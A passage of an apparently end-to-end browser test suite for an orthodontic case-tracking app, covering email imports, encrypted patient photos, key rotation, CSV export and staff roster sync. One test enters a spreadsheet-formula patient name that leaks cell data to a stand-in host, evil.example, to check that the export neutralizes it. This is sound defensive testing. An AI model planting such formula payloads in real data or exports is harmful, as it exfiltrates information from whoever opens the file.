  check(/On hold at the lab since 10-01-2026: Need lower jaw in the CBCT/.test(await owner.textContent('#drawer .notice.bad')), 'the case shows the hold and its reason');
  await owner.click('#drawer [data-act=clearHold]'); await owner.waitForFunction(() => !document.querySelector('#drawer .notice.bad'), null, { timeout: 20000 });
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
  const run2 = gas.ctx.checkMail();
  check(/0 emails sent/.test(run2), 'the next check sends nothing twice (' + run2 + ')');
  // the next day's summary lists the same hold again (holds stay on it for 7 days)
  gas.messages.push({ id: 'e3b', date: Date.now(), from: 'general@partnersdentalstudio.com', subject: 'Daily Cases Received, Shipped, and Held', text: '',
    html: '<p>No Cases Received Today</p><p>No Cases Shipped Today</p><p>Cases On Hold in the last 7 Days</p><table><tr><th>Patient Name</th><th>Case Number</th><th>Hold Date</th><th>Hold Reason</th></tr><tr><td>Mira H.</td><td>55120</td><td>10-01-2026</td><td>Need lower jaw in the CBCT</td></tr></table>' });
  check(/1 email sent/.test(gas.ctx.checkMail()), 'a new summary goes on the next check');
  await owner.waitForFunction(async () => (await B.inboxLoad()).length === 0, null, { timeout: 20000 });
  check(!(await st('Mira Holdsworth')).hold, 'a hold someone cleared isn’t brought back by the same hold in the next summary');
  dump = JSON.stringify(await fsDump());
  // (long base64 runs — ciphertext, encrypted photos — are left out: a short order # like ZQ88 can turn up in them by chance)
  { const plain = dump.replace(/"[A-Za-z0-9+/=_-]{40,}"/g, '""'), lk = /Brightwater|Marchetti|Shipdirect|Quillfeather|Velasquez|Holdsworth|Robin T|700111|ZQ88|ZQ77|lower jaw/.exec(plain);
    check(!lk, 'no patient name, case # or hold reason is readable anywhere in the database' + (lk ? ' — found “' + lk[0] + '” in …' + plain.slice(Math.max(0, lk.index - 160), lk.index + 60) + '…' : '')); }
  // the same update in both mailboxes and in the next day's summary is one row; Dismiss clears every copy, and it stays dismissed
  const holdHtml = (d, nm) => '<p>No Cases Received Today</p><p>No Cases Shipped Today</p><p>Cases On Hold in the last 7 Days</p><table><tr><th>Patient Name</th><th>Case Number</th><th>Hold Date</th><th>Hold Reason</th></tr><tr><td>' + nm + '</td><td>55999</td><td>10-01-2026</td><td>Need a new scan</td></tr></table><p>' + d + '</p>';
  const mA = { id: 'h1', date: Date.now() - 2 * H, from: 'general@partnersdentalstudio.com', subject: 'Daily Cases Received, Shipped, and Held', text: '', html: holdHtml('day 1', 'Wren Z.') };
  const mB = { id: 'h2', date: Date.now() - H, from: 'general@partnersdentalstudio.com', subject: 'Daily Cases Received, Shipped, and Held', text: '', html: holdHtml('day 2', 'Wren Z.') };
  gas.messages.push(mA); gas.ctx.checkMail();
  const gas2 = makeGas({ source: script, messages: [Object.assign({}, mA, { id: 'r1' }), Object.assign({}, mB, { id: 'r2' })], user: 'records@example.com' });
  check(/2 emails sent/.test(gas2.ctx.setup()), 'a second mailbox (records@) runs the same script');
  await owner.click('#nav-today'); await owner.waitForSelector('#mailCard .mlRow:has-text("Wren Z.")', { timeout: 30000 });
  await owner.waitForFunction(() => /in 3 emails/.test((document.querySelector('#mailCard') || {}).textContent || ''), null, { timeout: 30000 });
  check((await owner.locator('#mailCard .mlRow:has-text("Wren Z.")').count()) === 1, 'the same hold in 3 emails (both mailboxes, two days) shows once: “in 3 emails”');
  await owner.click('#mailCard .mlRow:has-text("Wren Z.") [data-act=mailSkip]');
  await owner.waitForFunction(async () => (await B.inboxLoad()).length === 0, null, { timeout: 20000 });
  check(!(await owner.isVisible('#mailCard .mlRow:has-text("Wren Z.")')), 'Dismiss clears every copy (all 3 emails leave the inbox)');
  gas2.messages.push({ id: 'r3', date: Date.now(), from: 'general@partnersdentalstudio.com', subject: 'Daily Cases Received, Shipped, and Held', text: '', html: holdHtml('day 3', 'Wren Z.') });
  gas2.ctx.checkMail();
  await owner.waitForFunction(async () => (await B.inboxLoad()).length === 0, null, { timeout: 30000 });
  check(!(await owner.isVisible('#mailCard .mlRow:has-text("Wren Z.")')), 'the next day’s summary with the same hold doesn’t bring it back');
  gas2.messages.push({ id: 'r4', date: Date.now(), from: 'general@partnersdentalstudio.com', subject: 'Daily Cases Received, Shipped, and Held', text: '', html:
    '<p>Cases Received Today</p><table><tr><th>Patient Name</th><th>Case Number</th></tr><tr><td>Yara Q.</td><td>56001</td></tr><tr><td>Xeno P.</td><td>56002</td></tr></table><p>No Cases Shipped Today</p>' });
  gas2.ctx.checkMail();
  await owner.waitForFunction(() => document.querySelectorAll('#mailCard .mlRow').length === 2, null, { timeout: 30000 });
  await owner.click('#mailCard [data-act=mailSkipAll]'); await owner.click('#cbYes');
  await owner.waitForSelector('.toast:has-text("2 email updates dismissed")', { timeout: 20000 });
  await owner.waitForFunction(async () => !document.querySelector('#mailCard') && (await B.inboxLoad()).length === 0, null, { timeout: 20000 });
  check(true, 'Dismiss all clears the card (and the emails)');
  // the website's appointment requests come through the same script, but they're NLO Leads' (it files them and clears them)
  check(/thenextlevelorthodontics@orthohost\.com/.test(JSON.stringify((await fsDump(['meta'])).find(d => d.name.endsWith('/meta/inbox')).fields.senders)), 'the script’s sender list includes the website form’s mailer');
  gas2.messages.push({ id: 'w1', date: Date.now(), from: 'thenextlevelorthodontics@orthohost.com', subject: 'Website Appointment Request - Sky',
    text: 'Patient Name: Sky Madeup\nParent Name:\nEmail: sky.madeup@example.com\nPhone: 3525550142\nMessage: Hello\n\n---\n\nDate: October 2, 2026\nPage URL: https://thenextlevelorthodontics.com/request-an-appointment/' },
  { id: 'w2', date: Date.now() + 1000, from: 'Asana <no-reply@asana.com>', subject: 'Website Appointment Request - Sky', text: 'Error processing your incoming email' });
  check(/2 emails sent/.test(gas2.ctx.checkMail()), 'a website request and Asana’s notice in the same thread go through the script');
  await owner.waitForFunction(async () => (await B.inboxLoad()).length === 2, null, { timeout: 20000 }); await sleep(2500);
  check(await owner.evaluate(() => !MAILS.unread.length && !MAILS.list.length && !document.querySelector('#mailCard')), 'NLO Cases leaves them alone: no “format the app doesn’t read” note, nothing on Today');
  check((await owner.evaluate(async () => (await B.inboxLoad()).length)) === 2, '…and leaves them in the inbox for NLO Leads');
  await owner.evaluate(async () => { for (const d of await B.inboxLoad()) await B.inboxDelete(d.id); }); // what NLO Leads does once it has them
  await owner.click('#nav-admin'); await owner.waitForSelector('#mailAdmin .mlBeat:has-text("office@example.com")', { timeout: 20000 });
  check(true, 'Team & security shows each mailbox’s last check');
  await owner.click('#mailAdmin [data-act=mailOff]'); await owner.click('#cbYes'); await owner.waitForSelector('.toast:has-text("turned off")', { timeout: 20000 });
  gas.cache.clear(); gas.messages.push({ id: 'e9', date: Date.now(), from: 'noreply@ulabsystems.com', subject: 'Your uLab order ZQ99 has shipped.', text: 'Order Number: ZQ99\nPatient Name: Ulysses Marchetti' });
  let offErr = ''; try { gas.ctx.checkMail(); } catch (e) { offErr = e.message; }
  check(/inbox key|turned off/.test(offErr), 'after Turn off the script can’t send anything');
  await owner.click('#nav-today');

  console.log('\n# Patient photos: added, reused, changed, removed, pasted, blurred, re-sealed');
  // test pictures drawn in the page (made-up), as a camera or a file would give them
  const pic = async (color, name) => ({ name, mimeType: 'image/jpeg', buffer: Buffer.from(await owner.evaluate(cl => { const c = document.createElement('canvas'); c.width = 1200; c.height = 1500; const g = c.getContext('2d');
    g.fillStyle = cl; g.fillRect(0, 0, 1200, 1500); g.fillStyle = '#f1c7a5'; g.beginPath(); g.ellipse(600, 620, 260, 330, 0, 0, 7); g.fill(); g.fillStyle = '#222'; g.fillRect(470, 560, 40, 40); g.fillRect(690, 560, 40, 40);
    return c.toDataURL('image/jpeg', 0.92).split(',')[1]; }, color), 'base64') });
  const picA = await pic('#3a7bd5', 'a.jpg'), picB = await pic('#d53a7b', 'b.jpg');
  const PP = 'Pia Portrait';
  const ptCases = pg => pg.evaluate(n => openCases().filter(c => c.patient === n).map(c => ({ id: c.id, type: c.type, photo: c.photo || '' })), PP);
  const photoDocs = async () => (await fsDump()).filter(d => d.name.includes('/photos/'));
  const editorSave = async (pg, file) => { await pg.setInputFiles('#phFile', file); await pg.waitForSelector('#phCrop:not([hidden])'); await pg.click('#phWrap [data-ph=save]'); await pg.waitForSelector('#phWrap', { state: 'detached', timeout: 20000 }); };
  // 1) New case with a photo taken in the form
  await owner.click('#nav-today'); await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm #cf-photo');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.fill('#cf-patient', PP);
  await owner.click('#cf-photo'); await owner.waitForSelector('#phWrap .phDrop');
  await editorSave(owner, picA);
  check(/Change photo/.test(await owner.textContent('#cf-photo .phSlotL')), 'the New case form takes a photo (cropped in the browser) before the case is saved');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.waitForFunction(n => openCases().some(c => c.patient === n && c.photo), PP, { timeout: 20000 });
  let pc = await ptCases(owner); const idA = pc[0].id;
  let pd = await photoDocs();
  const pdA = pd.find(d => d.name.endsWith('/photos/' + idA));
  check(!!pdA && Object.keys(pdA.fields).sort().join() === 'at,by,ct,iv,pv,v' && pdA.fields.pv.stringValue === pc[0].photo, 'the photo is saved with the new case: only sealed bytes, its version id and who/when (photos/' + idA.slice(0, 6) + '…)');
  check(!pdA.fields.ct.stringValue.startsWith('/9j/') && pdA.fields.ct.stringValue.length < 60000, 'what’s stored isn’t a readable JPEG, and it’s small (' + pdA.fields.ct.stringValue.length + ' characters)');
  const shrunk = await owner.evaluate(async id => { const r = await B.getPhoto(id); const im = new Image(); im.src = 'data:image/jpeg;base64,' + b64(r.bytes); await im.decode(); return [im.naturalWidth, im.naturalHeight, r.bytes.length]; }, idA);
  check(shrunk[0] === 160 && shrunk[1] === 160 && shrunk[2] < 30000, 'the 1200×1500 picture was cut to a 160×160 square before it left the browser (' + shrunk.join(' × ').replace(/ × (\d+)$/, ', $1 bytes') + ')');
  // 2) Gwen sees it next to the name
  await gwen.click('#nav-list'); await gwen.fill('#q', PP);
  await gwen.waitForSelector('tr.click:has-text("' + PP + '") .pav.on img', { timeout: 20000 });
  check(/^data:image\/jpeg;base64,/.test(await gwen.getAttribute('tr.click:has-text("' + PP + '") .pav.on img', 'src')), 'Gwen sees the photo next to the name (opened with the office key in her browser)');
  // 3) The patient's next case brings the photo along; one case made without it
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm #cf-photo');
  await owner.click('#ncForm .tt[data-tile=retainer]'); await owner.fill('#cf-patient', PP);
  await owner.waitForSelector('#cf-photo.set', { timeout: 15000 });
  check(/From their other case/.test(await owner.textContent('#cf-photo .phSlotL')), 'a new case for the same patient picks up their photo');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm #cf-photo');
  await owner.click('#ncForm .tt[data-tile=models]'); await owner.fill('#cf-patient', PP); await owner.waitForSelector('#cf-photo.set', { timeout: 15000 });
  await owner.click('#cf-photo'); await owner.click('#phWrap [data-ph=remove]'); await owner.waitForSelector('#phWrap', { state: 'detached' });
  check(!(await owner.isVisible('#cf-photo.set')), '…or not, if it’s taken off in the form');
  await owner.fill('#cf-chart', '77-1'); await owner.waitForTimeout(600);
  check(!(await owner.isVisible('#cf-photo.set')), 'and it doesn’t come back while typing');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.waitForFunction(n => openCases().filter(c => c.patient === n).length === 3, PP, { timeout: 20000 });
  pc = await ptCases(owner);
  const idR = pc.find(c => c.type === 'retainer').id, idM = pc.find(c => c.type === 'models').id;
  check(!!pc.find(c => c.type === 'retainer').photo && !pc.find(c => c.type === 'models').photo && pc.find(c => c.type === 'retainer').photo !== pc[0].photo, 'retainer case: its own copy of the photo; study models: none');
  // 4) Gwen changes the photo on the Oliv case: it also goes on the photo-less case; Undo puts things back
  const bytesA = await owner.evaluate(id => B.getPhoto(id).then(r => b64(r.bytes)), idA);
  await gwen.evaluate(id => openDrawer(id), idA); await gwen.waitForSelector('#drawer .dPh .pav.on', { timeout: 20000 });
  await gwen.click('#drawer .dPh'); await gwen.waitForSelector('#phWrap #phNow.on', { timeout: 10000 });
  check(await gwen.isVisible('#phWrap [data-ph=remove]'), 'the case’s photo opens in the photo window (with Remove photo)');
  await editorSave(gwen, picB);
  await gwen.waitForSelector('.toast:has-text("Photo changed")', { timeout: 20000 });
  check(/also on 1 other open case/.test(await gwen.textContent('.toast:has-text("Photo changed")')), 'Gwen changes the photo; the patient’s case without one gets it too (' + (await gwen.textContent('.toast:has-text("Photo changed")')).replace(/Undo/, '').trim() + ')');
  await gwen.waitForSelector('#histBox .hist:has-text("changed the photo")', { timeout: 20000 });
  check(true, 'the case’s history shows who changed the photo');
  await owner.waitForFunction(id => !!(openCases().find(c => c.id === id) || {}).photo, idM, { timeout: 20000 });
  const bytesB = await owner.evaluate(id => B.getPhoto(id).then(r => b64(r.bytes)), idA);
  check(bytesB !== bytesA && bytesB === await owner.evaluate(id => B.getPhoto(id).then(r => b64(r.bytes)), idM), 'the new picture is on both cases');
  await gwen.click('.toast:has-text("Photo changed") button'); await gwen.waitForSelector('.toast:has-text("Undone")', { timeout: 20000 });
  await owner.waitForFunction(id => !(openCases().find(c => c.id === id) || {}).photo, idM, { timeout: 20000 });
  check(await owner.evaluate(id => B.getPhoto(id).then(r => b64(r.bytes)), idA) === bytesA && !(await photoDocs()).some(d => d.name.endsWith('/photos/' + idM)), 'Undo puts the old picture back and takes it off the other case');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');
  // 5) Remove a photo; then paste one in
  await owner.evaluate(id => openDrawer(id), idR); await owner.waitForSelector('#drawer .dPh .pav.on', { timeout: 20000 });
  await owner.click('#drawer .dPh'); await owner.click('#phWrap [data-ph=remove]'); await owner.waitForSelector('.toast:has-text("Photo removed")', { timeout: 20000 });
  await owner.waitForFunction(id => !(openCases().find(c => c.id === id) || {}).photo, idR, { timeout: 20000 });
  check(!(await photoDocs()).some(d => d.name.endsWith('/photos/' + idR)) && !(await owner.isVisible('#drawer .dPh .pav.on')), 'Remove photo deletes the stored picture; the case shows the plain placeholder');
  await owner.evaluate(async b => { const bin = atob(b), u = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    const dt = new DataTransfer(); dt.items.add(new File([u], 'clip.png', { type: 'image/jpeg' })); document.querySelector('#drawer').dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); }, picB.buffer.toString('base64'));
  await owner.waitForSelector('#phCrop:not([hidden])', { timeout: 10000 }); await owner.click('#phWrap [data-ph=save]');
  await owner.waitForSelector('.toast:has-text("Photo added")', { timeout: 20000 });
  check(true, 'pasting a picture (e.g. a screenshot) while a case is open adds it as the photo');
  await owner.evaluate(async () => { const t = document.querySelector('#cmtText'); t.focus(); const dt = new DataTransfer(); dt.setData('text/plain', 'just text'); t.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); });
  check(!(await owner.isVisible('#phWrap')), 'pasting text into the comment box stays text');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  // 6) Blur on this computer
  await owner.click('#nav-list'); await owner.fill('#q', PP); await owner.waitForSelector('.topBar [data-act=phHide]');
  await owner.click('.topBar [data-act=phHide]');
  check(await owner.evaluate(() => document.body.classList.contains('phHide') && localStorage.getItem('nloCases.hidePhotos') === '1') &&
    /blur/.test(await owner.evaluate(() => getComputedStyle(document.querySelector('tr.click .pav.on img')).filter)), 'Hide photos blurs them on this computer (and remembers it here)');
  await owner.click('.topBar [data-act=phHide]');
  check(!(await owner.evaluate(() => document.body.classList.contains('phHide'))), 'and shows them again');
  await owner.fill('#q', '');
  // 7) Office key change: photos are re-sealed; Gwen opens them with the new key
  const vBefore = await owner.evaluate(() => B.curV);
  await owner.click('#nav-admin'); await owner.click('[data-act=rotate]'); await owner.click('#cbYes');
  await owner.waitForSelector('.toast:has-text("Office key changed")', { timeout: 60000 });
  check(/photos? re-sealed/.test(await owner.textContent('.toast:has-text("Office key changed")')), 'changing the office key re-seals the photos too');
  pd = await photoDocs();
  check(pd.length >= 2 && pd.every(d => d.fields.v.integerValue === String(vBefore + 1)), 'every stored photo is now on key version ' + (vBefore + 1) + ' (' + pd.length + ' photos)');
  await gwen.evaluate(() => { PH.cache.clear(); }); await gwen.click('#nav-today'); await gwen.click('#nav-list'); await gwen.fill('#q', PP);
  await gwen.waitForSelector('tr.click:has-text("Oliv") .pav.on img', { timeout: 20000 });
  check(true, 'Gwen (still signed in) opens the re-sealed photos');
  // 8) Deleting a case takes its photo with it
  await owner.evaluate(id => openDrawer(id), idR); await owner.waitForSelector('#drawer [data-act=delCase]');
  await owner.click('#drawer [data-act=delCase]'); await owner.click('#cbYes'); await owner.waitForSelector('.toast:has-text("Case deleted")', { timeout: 20000 });
  check(!(await photoDocs()).some(d => d.name.endsWith('/photos/' + idR)), 'a deleted case’s photo is deleted with it');
  dump = JSON.stringify(await fsDump());
  // (whole words only: a 3-letter piece like “Pia” turns up by chance in hundreds of KB of random-looking ciphertext)
  check(!/Pia Portrait|Portrait/.test(dump), 'the patient’s name isn’t readable anywhere in the database');
  await gwen.fill('#q', ''); await owner.click('#nav-today');

  console.log('\n# Delivery time; retainer labels offer to complete the case');
  const tmr = await owner.evaluate(() => { const d = new Date(); d.setDate(d.getDate() + 1); return isoOf(d); });
  await owner.click('#nav-list'); await owner.fill('#q', '');
  await newCase(owner, { type: 'retainer', patient: 'Rhea Labelworth', delivery: tmr, time: '13:30' });
  await gwen.click('#nav-today'); await openByName(gwen, 'Rhea Labelworth');
  check(/Delivery appt[A-Za-z]{3}, [A-Za-z]{3} \d+, 1:30 PM/.test((await gwen.textContent('#drawer .kv')).replace(/\s+/g, ' ')) && await gwen.isVisible('#drawer .kv .due:has-text("Appt tomorrow 1:30 PM")'),
    'the appointment time is saved (encrypted) and Gwen sees it: “Appt tomorrow 1:30 PM”');
  await gwen.click('#dLbl [data-act=retLabels]'); await gwen.waitForSelector('#rl-prev .print-label');
  await gwen.evaluate(() => { window.__printed = null; window.print = () => { window.__printed = { n: document.querySelectorAll('#print-container .print-page').length, txt: document.querySelector('#print-container').textContent }; window.dispatchEvent(new Event('afterprint')); }; });
  await gwen.click('#rl-print'); await gwen.waitForFunction(() => window.__printed, null, { timeout: 10000 });
  const rlp = await gwen.evaluate(() => window.__printed);
  check(rlp.n === 1 && /Rhea Labelworth/.test(rlp.txt) && /Retainers/.test(rlp.txt), 'Print label sends the retainer label (one 2×4 page)');
  await gwen.waitForSelector('#cbYes', { timeout: 10000 });
  check(/Mark this case complete\?/.test(await gwen.textContent('#modalWrap')), 'after printing it asks whether to mark the case complete');
  await gwen.click('#cbYes'); await gwen.waitForSelector('.toast:has-text("marked complete")', { timeout: 15000 });
  await owner.waitForFunction(() => !openCases().some(c => c.patient === 'Rhea Labelworth'), null, { timeout: 15000 }).catch(() => {});
  check(!(await owner.evaluate(() => openCases().some(c => c.patient === 'Rhea Labelworth'))), '“Mark complete” completes it for everyone');
  await gwen.click('#nav-today');

  console.log('\n# Today: clean up old cases in bulk (complete with undo, delete)');
  await owner.evaluate(async () => {
    for (const n of ['One', 'Two', 'Three']) await B.createCase({ type: 'retainer', patient: 'Bulkcase ' + n, stage: 'pickup', deliveryDate: '2025-01-15', comments: [], createdAt: Date.now(), createdBy: meSid() });
    await B.createCase({ type: 'retainer', patient: 'Bulkcase Fresh', stage: 'pickup', deliveryDate: todayISO(), comments: [], createdAt: Date.now(), createdBy: meSid() });
    await B.createCase({ type: 'oliv', patient: 'Bulkcase Nodate', stage: 'mfg', importedAt: Date.now(), comments: [], createdAt: Date.now(), createdBy: meSid() });
  });
  await owner.click('#nav-today'); await owner.fill('#q', 'Bulkcase');
  await owner.waitForSelector('#cleanCard .oldRow:has-text("Bulkcase Three")', { timeout: 20000 });
  check((await owner.locator('#cleanCard .oldRow').count()) === 3 && !(await owner.isVisible('#cleanCard .oldRow:has-text("Bulkcase Fresh")')), 'the first page lists open cases older than 3 months (not the recent one)');
  check(/3 of 3 ticked/.test(await owner.textContent('#oldStatus')) && /Mark 3 complete/.test(await owner.textContent('#cleanCard [data-act=oldDone]')), 'all ticked by default: Mark 3 complete');
  await owner.check('#oldNoDate');
  await owner.waitForSelector('#cleanCard .oldRow:has-text("Bulkcase Nodate")', { timeout: 10000 });
  check((await owner.locator('#cleanCard .oldRow').count()) === 4, 'an imported case with no dates can be included');
  await owner.uncheck('#oldNoDate'); await owner.waitForFunction(() => document.querySelectorAll('#cleanCard .oldRow').length === 3);
  await owner.click('#cleanCard [data-act=oldDone]'); await owner.click('#cbYes');
  await owner.waitForSelector('.toast:has-text("3 marked complete")', { timeout: 30000 });
  await owner.waitForFunction(() => !document.querySelector('#cleanCard .oldRow'), null, { timeout: 20000 });
  check(true, 'Mark complete clears them from the first page');
  await owner.click('.toast:has-text("3 marked complete") button');
  await owner.waitForFunction(() => document.querySelectorAll('#cleanCard .oldRow').length === 3, null, { timeout: 30000 });
  check(true, 'Undo brings them back');
  await owner.uncheck('#cleanCard .oldRow:has-text("Bulkcase Three") input');
  check(/Delete 2/.test(await owner.textContent('#cleanCard [data-act=oldDel]')), 'unticking one leaves 2 to act on');
  await owner.click('#cleanCard [data-act=oldDel]'); await owner.click('#cbYes');
  await owner.waitForSelector('.toast:has-text("2 deleted")', { timeout: 30000 });
  await owner.waitForFunction(() => document.querySelectorAll('#cleanCard .oldRow').length === 1, null, { timeout: 20000 });
  check(await owner.isVisible('#cleanCard .oldRow:has-text("Bulkcase Three")'), 'Delete removes the 2 ticked; the unticked one stays');
  await owner.selectOption('#oldMonths', '12'); await owner.waitForSelector('#cleanCard .sub:has-text("before")');
  check((await owner.locator('#cleanCard .oldRow').count()) === 1, 'the age can be changed (older than 12 months)');
  await owner.fill('#q', '');

  console.log('\n# Spreadsheet-formula text is neutralized in the export');
  await owner.fill('#q', ''); await newCase(owner, { type: 'models', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });

  console.log('\n# Export');
  await owner.click('#nav-import');
  const [dl] = await Promise.all([owner.waitForEvent('download', { timeout: 30000 }), (async () => { await owner.click('[data-act=exportCSV]'); await owner.click('#cbYes'); })()]);
  const exp = fs.readFileSync(await dl.path(), 'utf8');
  check(exp.includes(P1) && exp.includes(P2) && exp.includes('Imogen Fakeworth'), 'export includes open and completed cases');
  check(exp.includes('"\'=HYPERLINK(') && !/(^|,)"=HYPERLINK/m.test(exp), 'formula-looking text is exported as plain text');
  check(exp.includes('Digital enhancement 2 (DE2)') && exp.includes('Mouthguard (U)'), 'export carries DE and mouthguard details');
  check(/Aligners in set/.test(exp.split('\n')[0]) && !/,"?Due"?,/.test(exp.split('\n')[0]), 'export has aligners per set and no due-date column');
  check((exp.split('\n').find(l => l.includes('Rhea Labelworth')) || '').includes('"' + tmr + ' 13:30"'), 'export: the Delivery column carries the delivery time');
  check(exp.split('\n')[0].endsWith('Arches treated,Treatment start,Expected removal') && (exp.split('\n').find(l => l.includes('Nadia Setcount') && l.includes('"' + txS + '"')) || '').endsWith('"' + txS + '","' + txE + '"'), 'export: Treatment start and Expected removal columns (the in-house refinement carries its dates)');
  check(exp.split('\n')[0].includes('Ship to patient,Records on file,Zoom call') && exp.includes('STL scan; CBCT (upper & lower jaws)') && /"Yes"/.test(exp.split('\n').find(l => l.includes('Shelby Shipwell')) || ''), 'export carries Ship to patient, MARPE records and the Zoom call');

  console.log('\n# Activity');
  await owner.click('#nav-admin'); await owner.click('[data-act=loadActivity]');
  await owner.waitForSelector('#actBox .hist', { timeout: 20000 });
  check((await owner.locator('#actBox .hist').count()) >= 5, 'activity log lists recent changes');

  console.log('\n# Team from Staff Hub’s office roster (made-up roster in the database emulator)');
  const rput = (path, body) => fetch('http://127.0.0.1:9000/' + path + '.json?ns=demo-nlo-cases', { method: 'PUT', headers: { Authorization: 'Bearer owner' }, body: JSON.stringify(body) });
  const rp = (id, first, last, title, extra) => Object.assign({ id, name: first + ' ' + last, first, last, nick: first, short: first + ' ' + last[0] + '.', title, chairside: true, active: true }, extra || {});
  check((await rput('nlo/cadence/roster', { v: 1, source: 'staff-hub', updatedAt: Date.now(), people: {
    s_amir: { id: 's_amir', name: 'Dr. Amir Akhavan', first: 'Amir', last: 'Akhavan', nick: 'Dr. A', short: 'Dr. A', title: 'Orthodontist / Owner', chairside: true, active: true },
    s_gwen: rp('s_gwen', 'Gwen', 'Tester', 'Orthodontic assistant'), s_sarah: rp('s_sarah', 'Sarah', 'Tester', 'Treatment coordinator'),
    s_kaylee: rp('s_kaylee', 'Kaylee', 'Tester', 'Orthodontic assistant', { active: false, end: '2026-09-30' }),
    s_nina: rp('s_nina', 'Nina', 'Rostered', 'Orthodontic assistant'), s_leo: rp('s_leo', 'Leo', 'Departed', 'Front desk', { active: false, end: '2026-08-01' }) } })).ok, 'seeded a made-up office roster');
  await owner.click('#nav-today'); await owner.click('#nav-admin'); await owner.waitForSelector('#shBox');
  if (await owner.isVisible('#shBox [data-act=shConnect]')) await owner.click('#shBox [data-act=shConnect]');
  else await owner.click('#shBox [data-act=shRefresh]'); // (it may have read the roster earlier, before this one was seeded)
  await owner.waitForSelector('#shBox .shRow', { timeout: 20000 });
  const shText = async () => (await owner.textContent('#shBox')).replace(/\s+/g, ' ');
  let sh = await shText();
  check(/No NLO Cases login yet.*Nina Rostered/.test(sh) && !/Gwen Tester|Sarah Tester|Leo Departed|Amir/.test(sh.replace(/linked.*/, '')), 'Team & security lists the roster people without a login (not the ones who have one, nor ones who left): ' + sh.slice(0, 90));
  check(!/Left the practice/.test(sh), 'nobody who left still has a login (Kaylee was removed earlier)');
  await owner.click('#shBox [data-act=shAdd][data-rid=s_nina]'); await owner.waitForSelector('#asForm');
  check(await owner.inputValue('#asName') === 'Nina Rostered' && await owner.inputValue('#asUser') === 'nina', 'Add opens Add person with the name and username filled in');
  await owner.click('#asForm button[type=submit]'); await owner.waitForSelector('.modal .kv', { timeout: 30000 }); await owner.click('.modal [data-act=closeModal]');
  const nina = (await fsDump()).find(d => d.name.endsWith('/roster/nina'));
  check(nina && nina.fields.rid && nina.fields.rid.stringValue === 's_nina', 'her NLO Cases login remembers which roster person she is');
  await owner.waitForFunction(() => !/Nina Rostered/.test((document.querySelector('#shBox') || {}).textContent || 'Nina Rostered'), null, { timeout: 20000 });
  check(/Everyone on Staff Hub’s roster has a login/.test(await shText()), 'then everyone on the roster has a login');
  await rput('nlo/cadence/roster/people/s_sarah', rp('s_sarah', 'Sarah', 'Tester', 'Treatment coordinator', { active: false, end: '2026-10-01' }));
  await owner.click('#shBox [data-act=shRefresh]'); await owner.waitForSelector('#shBox .shGrp.bad .shRow:has-text("Sarah Tester")', { timeout: 20000 });
  check(await owner.isVisible('#shBox .shGrp.bad [data-act=removeStaff][data-sid=sarah]'), 'when Staff Hub ends someone’s employment, Team & security flags them with Remove login');
  // staff photos from Staff Hub: brought onto NLO Cases' own team list, so staff (who don't use Staff Hub) see them too
  const staffPic = await owner.evaluate(() => { const c = document.createElement('canvas'); c.width = c.height = 240; const g = c.getContext('2d'); g.fillStyle = '#5471A0'; g.fillRect(0, 0, 240, 240); g.fillStyle = '#F6D2B8'; g.beginPath(); g.arc(120, 110, 60, 0, 7); g.fill(); return c.toDataURL('image/jpeg', 0.9); });
  await rput('nlo/cadence/roster/people/s_gwen', rp('s_gwen', 'Gwen', 'Tester', 'Orthodontic assistant', { photo: staffPic }));
  await owner.click('#shBox [data-act=shRefresh]'); await owner.waitForSelector('.toast:has-text("staff photo")', { timeout: 20000 });
  const gwenRow = (await fsDump()).find(d => d.name.endsWith('/roster/gwen'));
  check(gwenRow && /^data:image\/jpeg;base64,/.test(gwenRow.fields.photo.stringValue) && gwenRow.fields.photo.stringValue.length < 12000 && gwenRow.fields.photoSrc, 'Gwen’s Staff Hub photo is brought in, shrunk (' + (gwenRow && gwenRow.fields.photo ? gwenRow.fields.photo.stringValue.length : 0) + ' characters)');
  await owner.waitForSelector('#app tr:has-text("Gwen Tester") .av.ph img', { timeout: 20000 });
  check(true, 'the team list shows her photo');
  await gwen.click('#nav-today'); await gwen.waitForSelector('#side .whoBox .av.ph img', { timeout: 20000 });
  check(true, 'and Gwen sees it in her own app (no Staff Hub sign-in needed)');
  await owner.click('#shBox [data-act=shRefresh]'); await owner.waitForTimeout(1500);
  check(!(await owner.isVisible('.toast:has-text("2 staff photos")')) && (await fsDump()).find(d => d.name.endsWith('/roster/gwen')).fields.photoSrc.stringValue === gwenRow.fields.photoSrc.stringValue, 'an unchanged photo isn’t brought in again');
  // staff as photo tiles with names underneath: Assistant and Assigned to
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm .staffRow[data-g=assistant] .sTile[data-v=gwen] .av.ph img', { timeout: 10000 });
  check(/Gwen/.test(await owner.textContent('#ncForm .staffRow[data-g=assistant] .sTile[data-v=gwen] .sNm')), 'New case: the Assistant choices are staff photos with the name underneath');
  await owner.click('#ncForm .tt[data-tile=retainer]'); await owner.fill('#cf-patient', 'Tobias Tilepick');
  await owner.click('#ncForm .staffRow[data-g=assistant] .sTile[data-v=gwen]');
  await owner.click('#ncForm details.cfMore summary'); await owner.click('#ncForm .aTiles .aTile[data-v=nina]');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.waitForFunction(() => openCases().some(c => c.patient === 'Tobias Tilepick'), null, { timeout: 20000 });
